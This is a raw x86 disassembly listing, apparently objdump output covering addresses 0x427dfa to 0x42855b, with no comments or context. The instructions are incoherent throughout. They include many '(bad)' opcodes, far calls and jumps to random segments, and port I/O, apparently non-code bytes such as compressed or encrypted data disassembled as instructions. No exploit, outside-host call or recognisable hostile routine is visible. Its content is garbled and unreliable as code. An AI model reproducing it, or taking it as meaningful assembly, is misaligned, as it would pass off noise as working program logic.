  427dfa:	in     eax,dx
  427dfb:	add    eax,0xdc643b55
  427e00:	sub    esi,edi
  427e02:	es dec ebp
  427e04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427e05:	pusha  
  427e06:	push   esp
  427e07:	and    bh,dh
  427e09:	dec    esp
  427e0a:	jnp    0x427e0a
  427e0c:	sub    al,ah
  427e0e:	call   FWORD PTR [ecx-0x47]
  427e11:	mov    ah,0x4
  427e13:	cli    
  427e14:	xchg   BYTE PTR [edx-0x1f98d667],bh
  427e1a:	stc    
  427e1b:	int3   
  427e1c:	inc    edx
  427e1d:	cmp    al,0xe5
  427e1f:	sbb    bl,ah
  427e21:	jl     0x427e71
  427e23:	cs dec esi
  427e25:	push   ecx
  427e26:	mov    bl,0xb9
  427e28:	lea    edx,[edx+esi*8+0x4faa7ff2]
  427e2f:	jno    0x427e3c
  427e31:	pop    ebp
  427e32:	push   edi
  427e33:	push   cs
  427e34:	into   
  427e35:	push   eax
  427e36:	in     eax,dx
  427e37:	inc    esi
  427e38:	test   al,0x1a
  427e3a:	call   0x76a0:0x4e75bea
  427e41:	scas   al,BYTE PTR es:[edi]
  427e42:	(bad)  
  427e44:	inc    esp
  427e45:	repz xor BYTE PTR [ebp-0xc6b2eec],al
  427e4c:	jae    0x427e7c
  427e4e:	sub    ah,BYTE PTR ds:0x3dc401dd
  427e54:	cwde   
  427e55:	data16 cld 
  427e57:	loopne 0x427eb7
  427e59:	std    
  427e5a:	push   ds
  427e5b:	fild   QWORD PTR [edi-0x42]
  427e5e:	sub    ebx,DWORD PTR [edx]
  427e60:	in     eax,dx
  427e61:	fbld   TBYTE PTR [edx+0x3c]
  427e64:	jae    0x427eaa
  427e66:	js     0x427e80
  427e68:	xchg   esi,eax
  427e69:	(bad)  [edi-0x6b4aa990]
  427e6f:	push   ecx
  427e70:	or     DWORD PTR [edi],ebx
  427e72:	aad    0x9a
  427e74:	mov    eax,ds:0xc196ac98
  427e79:	cmp    cl,BYTE PTR [edi]
  427e7b:	pop    ebx
  427e7c:	push   0xffffffac
  427e7e:	cmp    eax,0xa8b7f4ac
  427e83:	inc    esp
  427e84:	out    dx,al
  427e85:	jns    0x427ec4
  427e87:	dec    edi
  427e88:	push   0x9119e003
  427e8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427e8e:	add    al,0xc
  427e90:	retf   
  427e91:	imul   esp,DWORD PTR [edi],0xfffffff4
  427e94:	outs   dx,DWORD PTR ds:[esi]
  427e95:	xchg   BYTE PTR [esi-0x1bbf796],ah
  427e9b:	enter  0xa58b,0xa0
  427e9f:	repz xchg esi,eax
  427ea1:	stc    
  427ea2:	iret   
  427ea3:	sub    eax,DWORD PTR [esi+0x4dd748a0]
  427ea9:	xchg   edx,eax
  427eaa:	jne    0x427ef7
  427eac:	add    ebx,DWORD PTR [edx-0x668fd3da]
  427eb2:	fcomp  DWORD PTR [esi]
  427eb4:	mov    edx,0xe608d647
  427eb9:	mov    al,BYTE PTR [ebp-0x22]
  427ebc:	es loop 0x427eec
  427ebf:	fmul   DWORD PTR [ecx+0x6ad618a1]
  427ec5:	mov    al,ds:0x79c7c889
  427eca:	dec    edi
  427ecb:	cmp    DWORD PTR [ebp+ebx*2+0x2a],edi
  427ecf:	xor    ebp,ecx
  427ed1:	adc    al,0x3e
  427ed3:	stos   DWORD PTR es:[edi],eax
  427ed4:	inc    ebp
  427ed5:	cs add edx,ebp
  427ed8:	repnz fidiv WORD PTR [edx-0x51]
  427edc:	outs   dx,DWORD PTR ds:[esi]
  427edd:	pop    ds
  427ede:	repz rcl DWORD PTR ds:0x13e20387,1
  427ee5:	mov    ecx,0xe542812
  427eea:	pop    ecx
  427eeb:	mov    ebp,0xf562f42
  427ef0:	push   ecx
  427ef1:	jg     0x427ee1
  427ef3:	retf   
  427ef4:	cdq    
  427ef5:	xor    ah,BYTE PTR [ebp-0x3b9d88b6]
  427efb:	fldenv [edx-0x67]
  427efe:	pop    esi
  427eff:	je     0x427f54
  427f01:	into   
  427f02:	repnz cwde 
  427f04:	dec    ecx
  427f05:	sub    DWORD PTR [edi+0x74df1db1],esi
  427f0b:	js     0x427ef5
  427f0d:	aam    0x0
	...
  427f17:	add    BYTE PTR [eax],al
  427f19:	add    BYTE PTR [edx-0x107ddbc],bl
  427f1f:	(bad)  
  427f20:	fisub  DWORD PTR [esi-0x37]
  427f23:	and    dh,BYTE PTR [ecx+edx*1+0xf]
  427f27:	leave  
  427f28:	dec    ecx
  427f29:	mov    ecx,0x1f424
  427f2e:	cld    
  427f2f:	add    DWORD PTR [eax],eax
  427f31:	add    BYTE PTR [ecx],al
  427f33:	ss jb  0x427f63
  427f36:	push   es
  427f37:	fs push ds
  427f39:	cdq    
  427f3a:	inc    edi
  427f3b:	sub    BYTE PTR [edx],bl
  427f3d:	rcr    BYTE PTR [esi+ebx*1-0x64],cl
  427f41:	mov    dh,0xb2
  427f43:	mov    bh,0x6a
  427f45:	in     al,dx
  427f46:	(bad)  
  427f47:	adc    DWORD PTR [ebp+0x6],ecx
  427f4a:	push   ebp
  427f4b:	fst    DWORD PTR [ebp+0x58]
  427f4e:	hlt    
  427f4f:	xchg   ecx,eax
  427f50:	lds    edx,FWORD PTR [esi-0x2d]
  427f53:	loope  0x427f4a
  427f55:	daa    
  427f56:	neg    DWORD PTR [eax+0x10375d0]
  427f5c:	stc    
  427f5d:	push   esi
  427f5e:	lea    esi,[eax+0x15bd01a9]
  427f64:	(bad)  [esi+0x68]
  427f67:	jmp    0x1e12:0xb221d347
  427f6e:	mov    ss,WORD PTR cs:[ebx-0x53]
  427f72:	cmp    dl,BYTE PTR [ebp+0x7f]
  427f75:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427f76:	mov    ss,WORD PTR [ecx+0x488619e4]
  427f7c:	add    al,0xa7
  427f7e:	je     0x427f1c
  427f80:	popa   
  427f81:	fld    TBYTE PTR [esi+0x73de2c6c]
  427f87:	loope  0x427fac
  427f89:	aaa    
  427f8a:	cmp    edi,ecx
  427f8c:	call   0xaf90:0xc9b4cee1
  427f93:	js     0x427fb9
  427f95:	test   DWORD PTR [ebp+edx*8+0x28],esp
  427f99:	cmp    BYTE PTR [eax-0x1c7a82ef],0x3a
  427fa0:	das    
  427fa1:	lds    eax,FWORD PTR [ecx-0x1f]
  427fa4:	(bad)  
  427fa5:	and    cl,ch
  427fa7:	cmp    al,0x1a
  427fa9:	pop    ds
  427faa:	push   esp
  427fab:	in     eax,dx
  427fac:	popf   
  427fad:	test   DWORD PTR [edx+0x6236c44],ecx
  427fb3:	ret    0x82e3
  427fb6:	fadd   DWORD PTR [ecx+ecx*4-0x1e]
  427fba:	retf   0xf86
  427fbd:	xchg   esp,eax
  427fbe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427fbf:	aaa    
  427fc0:	pop    ds
  427fc1:	enter  0x41bc,0xc0
  427fc5:	mov    cl,0xd6
  427fc7:	lock jmp 0x427fb4
  427fca:	ret    
  427fcb:	out    0xb6,al
  427fcd:	mov    ecx,DWORD PTR [edx+0x35]
  427fd0:	enter  0x9218,0x8
  427fd4:	outs   dx,BYTE PTR ds:[esi]
  427fd5:	mov    ebx,0xb734e876
  427fda:	sub    al,0xcb
  427fdc:	fsub   DWORD PTR [eax+0x602e190c]
  427fe2:	add    DWORD PTR [edi+0x476c216d],edi
  427fe8:	cmp    DWORD PTR [ecx],ebp
  427fea:	jg     0x427fa1
  427fec:	ins    BYTE PTR es:[edi],dx
  427fed:	outs   dx,DWORD PTR ds:[esi]
  427fee:	xor    esp,DWORD PTR [ebx-0x3a]
  427ff1:	pop    ebx
  427ff2:	push   ebp
  427ff3:	sbb    eax,0xed017302
  427ff8:	test   al,0x46
  427ffa:	xchg   edx,eax
  427ffb:	add    BYTE PTR [edx+0x25811b33],ah
  428001:	aaa    
  428002:	imul   ebp,esp,0xffffffca
  428005:	in     al,dx
  428006:	shl    BYTE PTR [edx+0x4ec41f45],1
  42800c:	xchg   edx,eax
  42800d:	mov    cl,0x73
  42800f:	lods   eax,DWORD PTR ds:[esi]
  428010:	xchg   edi,eax
  428011:	or     al,0x7c
  428013:	push   esi
  428014:	js     0x428077
  428016:	out    dx,eax
  428017:	lods   eax,DWORD PTR ds:[esi]
  428018:	add    al,BYTE PTR [ecx+0x727be9ad]
  42801e:	repz mov cl,0xe7
  428021:	xchg   edi,eax
  428022:	sub    DWORD PTR [edi+0x3ea5a365],ebx
  428028:	lds    edi,FWORD PTR [eax+ecx*8-0x64]
  42802c:	ins    DWORD PTR es:[edi],dx
  42802d:	add    bl,BYTE PTR [esi+0xc]
  428030:	icebp  
  428031:	inc    dx
  428033:	dec    eax
  428034:	xchg   edx,eax
  428035:	loopne 0x428098
  428037:	and    bl,BYTE PTR [ebx+eiz*2]
  42803a:	dec    eax
  42803b:	mov    WORD PTR [edx-0x100c1e25],gs
  428041:	push   esi
  428042:	push   ebx
  428043:	pop    ebx
  428044:	imul   eax,DWORD PTR [ebx-0x40ab76a7],0xf64e242a
  42804e:	sub    BYTE PTR [esi],0x4c
  428051:	adc    al,0x54
  428053:	mov    dh,bl
  428055:	xor    bl,BYTE PTR [ecx]
  428057:	test   eax,0xfeefcb17
  42805c:	call   0x2c72:0xdbcd7a6d
  428063:	daa    
  428064:	jo     0x427fe6
  428066:	popf   
  428067:	and    ecx,esi
  428069:	pop    ss
  42806a:	mov    eax,0x36e4cd06
  42806f:	imul   ecx,DWORD PTR [ebx-0x617ff576],0x3ba4218
  428079:	int    0x9e
  42807b:	and    eax,0x593d945d
  428080:	aaa    
  428081:	mov    dl,BYTE PTR [edx]
  428083:	addr16 cdq 
  428085:	or     eax,DWORD PTR [eax+0x5ebb20a7]
  42808b:	inc    eax
  42808c:	daa    
  42808d:	nop
  42808e:	clc    
  42808f:	retf   
  428090:	pushf  
  428091:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428092:	(bad)  
  428093:	lods   al,BYTE PTR ds:[esi]
  428094:	mov    cs,WORD PTR [edi-0x80]
  428097:	out    dx,al
  428098:	inc    ebp
  428099:	mov    gs:0xd224e030,al
  42809f:	ja     0x4280eb
  4280a1:	div    BYTE PTR fs:[ebx-0x4d]
  4280a5:	sub    DWORD PTR [ecx+0x1f50f91b],edi
  4280ab:	aas    
  4280ac:	sbb    al,0xc5
  4280ae:	js     0x42803b
  4280b0:	xchg   edx,eax
  4280b1:	or     ebx,DWORD PTR [edx+0x66b281f7]
  4280b7:	repz push ecx
  4280b9:	or     al,0xea
  4280bb:	mov    ebp,0x4c3e313e
  4280c0:	ret    0x20d6
  4280c3:	out    0x38,al
  4280c5:	mov    al,ds:0xf7ce0de9
  4280ca:	sbb    edx,DWORD PTR ds:0xb28e4862
  4280d0:	out    0x30,al
  4280d2:	jl     0x4280ec
  4280d4:	add    BYTE PTR [ebp+0x32f06e29],ch
  4280da:	and    eax,0xcc2ac0a5
  4280df:	mov    bl,0x4c
  4280e1:	rcl    esp,1
  4280e3:	inc    ebp
  4280e4:	imul   ebp,DWORD PTR [eax+0xe4dc787],0xc3d9d7e4
  4280ee:	dec    ebx
  4280ef:	or     eax,DWORD PTR [eax+0x64]
  4280f2:	inc    DWORD PTR [ebx+edi*8-0x7f4ef619]
  4280f9:	push   ds
  4280fa:	jmp    0x56f2:0xec382be9
  428101:	xor    cl,BYTE PTR [ebx]
  428103:	fcom   st(6)
  428105:	push   ecx
  428106:	xchg   edx,eax
  428107:	xchg   esp,eax
  428108:	sbb    ebp,ebp
  42810a:	mov    esi,ebp
  42810c:	test   DWORD PTR ds:0x2bb43f38,ecx
  428112:	sbb    ecx,edi
  428114:	xor    cl,al
  428116:	mov    edx,0x5fee09d4
  42811b:	(bad)  
  42811c:	into   
  42811d:	inc    eax
  42811e:	dec    ecx
  42811f:	shl    al,0xa7
  428122:	dec    ecx
  428123:	mov    ds:0xd5cd5f31,eax
  428128:	pop    esi
  428129:	pushf  
  42812a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42812b:	cs push esi
  42812d:	data16 add BYTE PTR [eax],al
	...
  428138:	add    BYTE PTR [eax],al
  42813a:	nop
  42813b:	stos   DWORD PTR es:[edi],eax
  42813c:	es ret 
  42813e:	aas    
  42813f:	iret   
  428140:	cmc    
  428141:	sti    
  428142:	pushf  
  428143:	and    al,0x28
  428145:	push   ebp
  428146:	or     bl,BYTE PTR [edx]
  428148:	and    cl,ah
  42814a:	and    dh,dh
  42814c:	add    DWORD PTR [eax],eax
  42814e:	cld    
  42814f:	add    DWORD PTR [eax],eax
  428151:	add    BYTE PTR [esi+eax*2+0x7cb4e31d],ch
  428158:	aad    0xb4
  42815a:	inc    ecx
  42815b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42815c:	into   
  42815d:	call   0xb0c5657e
  428162:	pushf  
  428163:	mov    ebx,0xfa9aeca5
  428168:	test   edi,0xcda208c9
  42816e:	push   0x46
  428170:	adc    al,0x68
  428172:	mov    eax,0x26f46e5e
  428177:	xchg   esi,eax
  428178:	sbb    al,0x79
  42817a:	mov    dl,0x60
  42817c:	push   ebx
  42817d:	pop    eax
  42817e:	or     BYTE PTR [ebp-0x19],0x57
  428182:	jne    0x42812b
  428184:	cmp    al,0x2b
  428186:	cmp    ebx,DWORD PTR [ebx+0x12a4a2a5]
  42818c:	scas   eax,DWORD PTR es:[edi]
  42818d:	loope  0x428176
  42818f:	pmulhuw mm1,QWORD PTR [edi]
  428192:	call   0xbc58:0x8ac500cf
  428199:	sbb    ebx,esi
  42819b:	cmc    
  42819c:	fcmovnbe st,st(1)
  42819e:	xlat   BYTE PTR ds:[ebx]
  42819f:	xor    eax,0xa21438ef
  4281a4:	out    0x70,eax
  4281a6:	in     al,dx
  4281a7:	or     dh,0x80
  4281aa:	aas    
  4281ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4281ac:	shr    BYTE PTR [ebp+0x25],0xa1
  4281b0:	div    BYTE PTR [eax]
  4281b2:	scas   eax,DWORD PTR es:[edi]
  4281b3:	mov    eax,ds:0x9466a37c
  4281b8:	push   esi
  4281b9:	push   0x1e568a22
  4281be:	dec    esi
  4281bf:	mov    bh,0xc6
  4281c1:	retf   
  4281c2:	fadd   DWORD PTR [edx]
  4281c4:	popf   
  4281c5:	ror    dl,1
  4281c7:	repnz cmc 
  4281c9:	dec    eax
  4281ca:	or     al,0x97
  4281cc:	fld    QWORD PTR [ebx+0x2c]
  4281cf:	js     0x4281ff
  4281d1:	mov    eax,0x35d5b15d
  4281d6:	mov    ds:0x12befa6c,eax
  4281db:	(bad)  
  4281dc:	scas   al,BYTE PTR es:[edi]
  4281dd:	mov    al,BYTE PTR [edx-0x714a5d52]
  4281e3:	vrcpss xmm4,xmm3,DWORD PTR [di-0x783f]
  4281eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4281ec:	int3   
  4281ed:	data16 in al,dx
  4281ef:	or     BYTE PTR [eax],0x4e
  4281f2:	inc    esi
  4281f3:	adc    al,0x29
  4281f5:	mov    bh,ah
  4281f7:	int3   
  4281f8:	retf   0x2903
  4281fb:	(bad)  
  4281fc:	das    
  4281fd:	inc    ebx
  4281fe:	xor    dl,BYTE PTR [ebx-0x37]
  428201:	sub    DWORD PTR [ebx+ebx*8-0x625a2ea],esp
  428208:	jmp    0x8a7d:0x1765ab3f
  42820f:	mov    es,edx
  428211:	jg     0x4281e7
  428213:	pop    edi
  428214:	imul   edx,DWORD PTR [eax+0x385cb3a5],0x14
  42821b:	fst    st(3)
  42821d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42821e:	adc    al,0xa9
  428220:	out    dx,al
  428221:	call   0x3d00:0xa6cba570
  428228:	ins    DWORD PTR es:[edi],dx
  428229:	jg     0x42822e
  42822b:	ret    0x81aa
  42822e:	(bad)  
  42822f:	pop    edi
  428230:	data16 test dl,dl
  428233:	int3   
  428234:	mov    esi,0x9d11be8c
  428239:	push   esi
  42823a:	xor    ecx,DWORD PTR [edx-0x194cb5c1]
  428240:	aas    
  428241:	sub    ebp,DWORD PTR [ebx-0x40]
  428244:	(bad)  
  428245:	stos   DWORD PTR es:[edi],eax
  428246:	loop   0x4281d6
  428248:	daa    
  428249:	sub    eax,0xe61fc914
  42824e:	jnp    0x4281f4
  428250:	or     BYTE PTR [esi],dl
  428252:	push   ebx
  428253:	push   cs
  428254:	jo     0x428212
  428256:	call   0xe5d:0x5bc2f465
  42825d:	outs   dx,BYTE PTR ds:[esi]
  42825e:	dec    edi
  428260:	fld    TBYTE PTR [eax+0x10]
  428263:	xor    DWORD PTR [esi-0x66],eax
  428266:	dec    esp
  428267:	pop    ebx
  428268:	sub    BYTE PTR [esi],ah
  42826a:	or     bh,ch
  42826c:	pushf  
  42826d:	xor    al,0xe9
  42826f:	inc    esi
  428270:	jo     0x4282c3
  428272:	inc    ecx
  428273:	cmp    eax,0x43a5082
  428278:	dec    esi
  428279:	popf   
  42827a:	pusha  
  42827b:	imul   edi,DWORD PTR [edi],0xe7469e2e
  428281:	ret    
  428282:	push   edx
  428283:	mov    BYTE PTR [esi-0x58],bh
  428286:	cmp    DWORD PTR [eax+0x2fc44a90],0x229c62c8
  428290:	or     edx,DWORD PTR [ebp+ebp*1-0x4a]
  428294:	pop    ecx
  428295:	inc    ebx
  428296:	xor    eax,0xb02784a1
  42829b:	add    DWORD PTR [eax+0x5],0x7b
  42829f:	xor    BYTE PTR [edx-0x2ae8b5b5],cl
  4282a5:	bound  esi,QWORD PTR ds:0x8f377c30
  4282ab:	add    al,0x10
  4282ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4282ae:	lods   eax,DWORD PTR ds:[esi]
  4282af:	add    BYTE PTR [edi-0x7d],bh
  4282b2:	pop    edx
  4282b3:	ficomp DWORD PTR [ebp+0x72768024]
  4282b9:	push   ss
  4282ba:	ins    BYTE PTR es:[edi],dx
  4282bb:	cmp    esp,ebx
  4282bd:	lods   eax,DWORD PTR ds:[esi]
  4282be:	dec    BYTE PTR [eax]
  4282c0:	cs loopne 0x42828c
  4282c3:	mov    DWORD PTR [esi-0x495c7afe],eax
  4282c9:	fstp   QWORD PTR [edi-0x449d60b7]
  4282cf:	and    al,0x1b
  4282d1:	push   ds
  4282d2:	xor    al,0xa7
  4282d4:	inc    edx
  4282d5:	xor    bl,BYTE PTR [eax+0x416acc59]
  4282db:	fcomp  DWORD PTR [edx+0x53]
  4282de:	cmp    eax,DWORD PTR [eax+0x6f316eaf]
  4282e4:	jge    0x4282fb
  4282e6:	repz stc 
  4282e8:	mov    bl,0x85
  4282ea:	dec    esp
  4282eb:	popf   
  4282ec:	pop    ebx
  4282ed:	mov    edx,0x36692d4a
  4282f2:	xlat   BYTE PTR ds:[ebx]
  4282f3:	cmp    esp,esi
  4282f5:	cdq    
  4282f6:	loop   0x428303
  4282f8:	(bad)  
  4282f9:	cmp    BYTE PTR [ecx-0x51],ch
  4282fc:	fwait
  4282fd:	std    
  4282fe:	mov    cs,WORD PTR [edx+0x1d]
  428301:	rcl    BYTE PTR [edi],0x10
  428304:	lds    ebx,FWORD PTR [eax-0x75fa1db8]
  42830a:	aad    0x80
  42830c:	inc    ecx
  42830d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42830e:	dec    esi
  42830f:	rcr    BYTE PTR [ecx],0xd4
  428312:	mov    cl,0x5a
  428314:	call   0xd2cc:0x5087b156
  42831b:	push   eax
  42831c:	mov    BYTE PTR [esi],al
  42831e:	lods   al,BYTE PTR ds:[esi]
  42831f:	pop    esi
  428320:	les    edi,FWORD PTR [eax]
  428322:	neg    cl
  428324:	ror    DWORD PTR [ebx-0x2bcb0ff4],1
  42832a:	scas   eax,DWORD PTR es:[edi]
  42832b:	mov    cl,0xbd
  42832d:	xor    al,0x75
  42832f:	cmc    
  428330:	stc    
  428331:	adc    bh,cl
  428333:	mov    ah,0x96
  428335:	sbb    bl,BYTE PTR ds:0xb925cf2
  42833b:	pop    eax
  42833c:	into   
  42833d:	and    eax,0xed11ed03
  428342:	outs   dx,BYTE PTR ds:[esi]
  428343:	cdq    
  428344:	pop    ecx
  428345:	fst    DWORD PTR [esi-0x57f45c54]
  42834b:	loop   0x428313
  42834d:	lock add BYTE PTR [eax],al
	...
  428358:	add    BYTE PTR [eax],al
  42835a:	std    
  42835b:	cmp    DWORD PTR ds:0xfd1cf514,esi
  428361:	stc    
  428362:	jl     0x428396
  428364:	stc    
  428365:	jne    0x42832c
  428367:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428368:	sbb    BYTE PTR [eax+0x1f81c],bh
  42836e:	jmp    0xf3b2:0xb1000001
  428375:	jl     0x42838f
  428377:	retf   
  428378:	sahf   
  428379:	adc    al,0xc1
  42837b:	leave  
  42837c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42837d:	mov    WORD PTR [esi+0x6],fs
  428380:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428381:	pop    edi
  428382:	pop    ebx
  428383:	push   ds
  428384:	dec    edx
  428385:	imul   ebp,DWORD PTR [ebx+0x16d4bd94],0xffffffed
  42838c:	xchg   ebp,eax
  42838d:	xchg   edi,eax
  42838e:	sub    esi,DWORD PTR [ebx]
  428390:	imul   esp,DWORD PTR ds:0x3e35270b,0x32
  428397:	xor    al,0xbc
  428399:	into   
  42839a:	cld    
  42839b:	sbb    DWORD PTR [eax+0x2c48a2a9],edi
  4283a1:	hlt    
  4283a2:	jmp    0x428419
  4283a4:	adc    esp,esp
  4283a6:	repnz jmp 0xaa92:0xed275552
  4283ae:	es xchg edx,eax
  4283b0:	cmp    DWORD PTR [edx-0x7c],ebx
  4283b3:	mov    BYTE PTR [esi-0x53b6ac28],dh
  4283b9:	out    0xf,al
  4283bb:	out    dx,eax
  4283bc:	jnp    0x4283da
  4283be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4283bf:	pop    esi
  4283c0:	out    dx,eax
  4283c1:	xchg   ebx,eax
  4283c2:	loop   0x428386
  4283c4:	push   0xffffffc1
  4283c6:	mov    ebx,0xe89d2a18
  4283cb:	and    DWORD PTR [esi],esp
  4283cd:	adc    cl,ah
  4283cf:	aas    
  4283d0:	out    0xa,al
  4283d2:	xor    DWORD PTR [ebx+edi*8],edi
  4283d5:	pop    es
  4283d6:	sbb    BYTE PTR [esi+edx*8],0xbf
  4283da:	or     eax,0x7eb7c0b6
  4283df:	dec    ebp
  4283e0:	push   ebx
  4283e1:	sub    dh,BYTE PTR [esi]
  4283e3:	add    eax,0x77e979e9
  4283e8:	cmp    edi,DWORD PTR [ebp+0x9]
  4283eb:	adc    dl,ah
  4283ed:	add    cl,ch
  4283ef:	in     al,0xad
  4283f1:	and    eax,0xcfffc71
  4283f6:	xor    ch,BYTE PTR [ebx]
  4283f8:	sbb    BYTE PTR [ebp-0x215078ad],0x4a
  4283ff:	and    BYTE PTR [ebp+0x36b60461],al
  428405:	or     DWORD PTR [eax],edx
  428407:	jae    0x42846c
  428409:	cmp    BYTE PTR [esi-0x5c],0xec
  42840d:	(bad)  
  42840e:	mov    ah,0x27
  428410:	stos   DWORD PTR es:[edi],eax
  428411:	pop    es
  428412:	scas   eax,DWORD PTR es:[edi]
  428413:	add    ebp,DWORD PTR [edi+0x6f450862]
  428419:	fldenv [ecx+esi*4-0x18]
  42841d:	sub    al,0x12
  42841f:	loop   0x428416
  428421:	(bad)  
  428422:	sbb    al,0x0
  428424:	push   es
  428425:	shl    DWORD PTR [esi+0x191c2ebc],cl
  42842b:	adc    eax,0xa6b2ea2f
  428430:	lods   eax,DWORD PTR ds:[esi]
  428431:	out    dx,eax
  428432:	jge    0x4283bb
  428434:	jns    0x4283cd
  428436:	pop    ecx
  428437:	std    
  428438:	sbb    eax,0x59c37b62
  42843d:	bound  ebp,QWORD PTR [ebx+ebx*2]
  428440:	out    0xff,al
  428442:	scas   al,BYTE PTR es:[edi]
  428443:	xor    ebx,DWORD PTR [ecx-0x79]
  428446:	adc    cl,dl
  428448:	imul   ebx,DWORD PTR [ecx+0x72df05bd],0x274e51f5
  428452:	bound  esi,QWORD PTR [eax+0x4008726d]
  428458:	test   DWORD PTR [ebx-0x23f2c359],esi
  42845e:	arpl   WORD PTR [edx-0x69],sp
  428461:	cwde   
  428462:	pop    edx
  428463:	pop    ss
  428464:	mov    ebx,0x6d1f092
  428469:	add    ch,bl
  42846b:	fwait
  42846c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42846d:	push   ebx
  42846e:	cmc    
  42846f:	sub    DWORD PTR [bp+si],eax
  428472:	popa   
  428473:	test   al,0x2a
  428475:	push   0xa3393612
  42847a:	adc    ebx,ebp
  42847c:	mov    BYTE PTR [esi-0x63],bl
  42847f:	add    eax,0x7b634b55
  428484:	aas    
  428485:	or     eax,0x9c09e3a4
  42848a:	sbb    ecx,ecx
  42848c:	cli    
  42848d:	sbb    esi,DWORD PTR [edi]
  42848f:	sub    DWORD PTR [esi],edx
  428491:	inc    ebp
  428492:	fwait
  428493:	push   edi
  428494:	xchg   edx,eax
  428495:	mov    al,0x15
  428497:	and    bh,BYTE PTR [eax-0x26]
  42849a:	dec    eax
  42849b:	pop    ecx
  42849c:	pop    ds
  42849d:	mov    cs,ecx
  42849f:	div    esp
  4284a1:	push   esi
  4284a2:	imul   DWORD PTR [eax]
  4284a4:	in     eax,0x1
  4284a6:	add    DWORD PTR [ebx],esi
  4284a8:	push   edi
  4284a9:	mov    al,0xb1
  4284ab:	xchg   ebp,eax
  4284ac:	xchg   esp,eax
  4284ad:	imul   BYTE PTR [ecx-0x1b]
  4284b0:	sahf   
  4284b1:	lahf   
  4284b2:	sbb    cl,BYTE PTR [ebx+ebx*4+0x75]
  4284b6:	(bad)
  4284b9:	xor    dl,dh
  4284bb:	dec    ebx
  4284bc:	aam    0xa1
  4284be:	dec    esp
  4284bf:	adc    ch,BYTE PTR [edx-0x64c45143]
  4284c5:	or     BYTE PTR [esi+ebp*4],dl
  4284c8:	xor    dl,bh
  4284ca:	aaa    
  4284cb:	sahf   
  4284cc:	push   eax
  4284cd:	(bad)  
  4284ce:	inc    ebp
  4284cf:	mov    al,al
  4284d1:	jb     0x428551
  4284d3:	xchg   edx,eax
  4284d4:	out    dx,eax
  4284d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4284d6:	enter  0x8139,0x53
  4284da:	addr16 jmp 0x6a:0xf797d1f8
  4284e2:	ss dec esi
  4284e4:	ins    DWORD PTR es:[edi],dx
  4284e5:	mov    esi,0xdb74af5b
  4284ea:	aam    0x7f
  4284ec:	mov    cl,0x97
  4284ee:	jl     0x4284ec
  4284f0:	jae    0x42852a
  4284f2:	or     eax,0xc4b5c238
  4284f7:	mov    ebx,0x90f00c3b
  4284fc:	ja     0x4284b6
  4284fe:	leave  
  4284ff:	push   ecx
  428500:	jmp    0x42851a
  428502:	add    al,0x80
  428504:	ror    DWORD PTR [esi],cl
  428506:	call   0x3435a2a4
  42850b:	pushf  
  42850c:	(bad)  
  42850d:	aam    0xc1
  42850f:	ss push esp
  428511:	adc    al,0x6b
  428513:	lods   eax,DWORD PTR ds:[esi]
  428514:	push   edx
  428515:	loopne 0x4284b4
  428517:	pop    ebp
  428518:	int3   
  428519:	sbb    BYTE PTR [ebp-0x47],al
  42851c:	cwde   
  42851d:	push   esi
  42851e:	repz test DWORD PTR [eax],esi
  428521:	pop    esi
  428522:	idiv   esp
  428524:	sbb    al,0x28
  428526:	fwait
  428527:	(bad)  
  428529:	jp     0x428519
  42852b:	push   edi
  42852c:	fidivr WORD PTR [eax-0xb899c94]
  428532:	xchg   edi,eax
  428533:	int3   
  428534:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428535:	daa    
  428536:	adc    DWORD PTR [edi],ecx
  428538:	pop    esi
  428539:	fistp  QWORD PTR [edx-0x229e25ab]
  42853f:	mov    ds:0x5ff5246f,al
  428544:	fdivr  st(1),st
  428546:	std    
  428547:	sti    
  428548:	ret    
  428549:	ror    DWORD PTR [ebp+0x7c1911c6],cl
  42854f:	loope  0x4284f6
  428551:	push   edi
  428552:	js     0x4285a5
  428554:	cli    
  428555:	loopne 0x428522
  428557:	xchg   edx,eax
  428558:	mov    cl,0xfa
  42855a:	pop    ss
  42855b:	push   es
	...
